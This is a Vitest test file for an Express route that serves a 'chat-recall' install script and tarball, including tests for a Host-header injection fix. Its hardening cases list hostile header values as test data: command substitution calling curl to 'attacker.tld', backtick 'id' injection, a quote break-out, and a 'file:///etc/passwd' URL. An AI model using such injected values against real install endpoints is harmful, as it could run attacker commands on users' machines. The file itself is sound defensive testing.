/**
 * Public install surface — /install.sh must render a runnable POSIX script
 * pointing back at THIS server (proxy-header aware), and the tarball route
 * must fail loudly (not a bare 404) on builds without the pack step.
 */

import { describe, test, expect, beforeAll, afterAll, afterEach } from 'vitest';
import express, { type Express, type Request } from 'express';
import request from 'supertest';
import { writeFileSync, mkdtempSync, rmSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';

let app: Express;
let tmp: string;
// Bound in beforeAll from the same dynamic import as the router — a static
// import would load install.js before INSTALL_TGZ_PATH is set below.
let publicOrigin: typeof import('./install.js').publicOrigin;
let UnsafeOriginError: typeof import('./install.js').UnsafeOriginError;
const origEnv = { PUBLIC_URL: process.env.PUBLIC_URL, INSTALL_TGZ_PATH: process.env.INSTALL_TGZ_PATH };

beforeAll(async () => {
  tmp = mkdtempSync(join(tmpdir(), 'install-'));
  delete process.env.PUBLIC_URL;
  process.env.INSTALL_TGZ_PATH = join(tmp, 'chat-recall.tgz');
  // Env is read at module load for the tarball path — import AFTER setting it.
  const mod = await import('./install.js');
  const installRouter = mod.default;
  publicOrigin = mod.publicOrigin;
  UnsafeOriginError = mod.UnsafeOriginError;
  app = express();
  app.use('/', installRouter);
});
afterAll(() => {
  for (const [k, v] of Object.entries(origEnv)) {
    if (v === undefined) delete process.env[k as keyof typeof origEnv];
    else process.env[k] = v;
  }
  rmSync(tmp, { recursive: true, force: true });
});

describe('GET /install.sh', () => {
  test('renders a POSIX script pointing at the requesting origin (proxy headers win)', async () => {
    const res = await request(app)
      .get('/install.sh')
      .set('x-forwarded-proto', 'https')
      .set('x-forwarded-host', 'chat-recall.example.com');
    expect(res.status).toBe(200);
    expect(res.type).toBe('text/plain');
    expect(res.text).toContain('#!/bin/sh');
    expect(res.text).toContain('https://chat-recall.example.com/install/chat-recall.tgz');
    expect(res.text).toContain('chat-recall login https://chat-recall.example.com');
    // No bashisms that break `curl | sh` on dash: the shebang + set -eu only.
    expect(res.text).toContain('set -eu');
  });

  test('runs the full connect flow: token page URL → paste → login → sync', async () => {
    const res = await request(app)
      .get('/install.sh')
      .set('x-forwarded-proto', 'https')
      .set('x-forwarded-host', 'chat-recall.example.com');
    // Skip the dance when this machine already holds a working credential.
    expect(res.text).toContain('chat-recall login https://chat-recall.example.com --check');
    // Fresh machine: point at the token page (?view=connect) with a RANDOM
    // device slug — the hostname must never leak into a URL...
    expect(res.text).toContain('https://chat-recall.example.com/?view=connect&device=$DEVICE');
    expect(res.text).toContain('/dev/urandom');
    expect(res.text).not.toContain('$(hostname');
    // ...read the pasted token from the TERMINAL, not the piped-in script...
    expect(res.text).toContain('read TOKEN < /dev/tty');
    // ...connect with `init` (validates the token, registers the recall MCP in
    // Claude Code, and installs the background sync service in one step)...
    expect(res.text).toContain('chat-recall init --server https://chat-recall.example.com --token "$TOKEN"');
    // ...with --skip-sync so the first full sync runs in the BACKGROUND (the
    // installed service, or the MCP's own sync) and never holds the terminal.
    expect(res.text).toContain('--skip-sync');
    expect(res.text).toContain('syncing in the background');
    expect(res.text).not.toMatch(/^chat-recall sync\b/m);
    // No stale "open the site and mint a token by hand" instructions.
    expect(res.text).not.toMatch(/mint a device token/i);
  });

  test('PUBLIC_URL overrides request-derived origin', async () => {
    process.env.PUBLIC_URL = 'https://override.example.com/';
    try {
      const res = await request(app).get('/install.sh').set('host', 'ignored.local');
      expect(res.text).toContain('https://override.example.com/install/chat-recall.tgz');
      expect(res.text).not.toContain('ignored.local');
    } finally {
      delete process.env.PUBLIC_URL;
    }
  });
});

describe('GET /install/chat-recall.tgz', () => {
  test('missing tarball → diagnosable 404, not a bare one', async () => {
    const res = await request(app).get('/install/chat-recall.tgz');
    expect(res.status).toBe(404);
    expect(res.body.error).toMatch(/tarball/i);
    expect(res.body.hint).toMatch(/Dockerfile/);
  });

  test('serves the tarball when present', async () => {
    writeFileSync(join(tmp, 'chat-recall.tgz'), Buffer.from([0x1f, 0x8b, 0x08, 0x00]));
    const res = await request(app).get('/install/chat-recall.tgz');
    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toContain('application/gzip');
  });
});


/**
 * Host-header hardening (2026-08-16).
 *
 * /install.sh is piped straight into `sh`, and the origin is interpolated into
 * TGZ_URL — the URL the CLI is installed FROM. Before this, the value came
 * from X-Forwarded-Host with no validation, so a poisoned header (or a shared
 * cache keyed without it) could point the installer at an attacker's tarball,
 * and shell metacharacters survived into a double-quoted assignment where
 * `$(…)` still evaluates.
 */
function fakeReq(headers: Record<string, string>, protocol = 'https'): Request {
  return {
    protocol,
    get(name: string) { return headers[name.toLowerCase()]; },
  } as unknown as Request;
}

describe('publicOrigin — a request header cannot rewrite the install source', () => {
  // The suite's beforeAll clears PUBLIC_URL; keep that invariant between cases.
  afterEach(() => { delete process.env.PUBLIC_URL; });

  test.each([
    ['command substitution', 'evil.com$(curl attacker.tld)'],
    ['backticks', 'evil.com`id`'],
    ['quote break-out', 'evil.com" ; curl attacker.tld ; echo "'],
    ['whitespace', 'evil.com foo'],
    ['a path segment', 'evil.com/../../x'],
    ['a newline', 'evil.com\nRUN=1'],
    ['a smuggled scheme', 'https://evil.com'],
  ])('rejects a Host containing %s', (_label, host) => {
    expect(() => publicOrigin(fakeReq({ host }))).toThrow(UnsafeOriginError);
  });

  test('rejects a poisoned x-forwarded-host even when Host is clean', () => {
    expect(() => publicOrigin(fakeReq({ host: 'good.example.com', 'x-forwarded-host': 'evil.com`id`' })))
      .toThrow(UnsafeOriginError);
  });

  test('rejects a bogus forwarded protocol', () => {
    expect(() => publicOrigin(fakeReq({ host: 'good.example.com', 'x-forwarded-proto': 'javascript' })))
      .toThrow(UnsafeOriginError);
  });

  test('still accepts ordinary hosts, with and without a port', () => {
    expect(publicOrigin(fakeReq({ host: 'recall.internal:8080' }))).toBe('https://recall.internal:8080');
    expect(publicOrigin(fakeReq({ host: 'box.lan', 'x-forwarded-proto': 'http' }))).toBe('http://box.lan');
  });

  test('a malformed or non-http PUBLIC_URL is rejected rather than silently used', () => {
    process.env.PUBLIC_URL = 'not a url';
    expect(() => publicOrigin(fakeReq({}))).toThrow(UnsafeOriginError);
    process.env.PUBLIC_URL = 'file:///etc/passwd';
    expect(() => publicOrigin(fakeReq({}))).toThrow(UnsafeOriginError);
  });
});

describe('GET /install.sh — response hardening', () => {
  test('a poisoned Host yields a refusing script, never a poisoned one', async () => {
    const res = await request(app).get('/install.sh').set('host', 'evil.com`id`');
    expect(res.status).toBe(400);
    expect(res.text).not.toContain('evil.com');
    expect(res.text).toContain('PUBLIC_URL');
  });

  test('is never stored by a shared cache (the body depends on request headers)', async () => {
    const res = await request(app).get('/install.sh').set('host', 'good.example.com');
    expect(res.status).toBe(200);
    expect(res.headers['cache-control']).toContain('no-store');
    expect(res.headers['vary']).toMatch(/x-forwarded-host/i);
  });
});
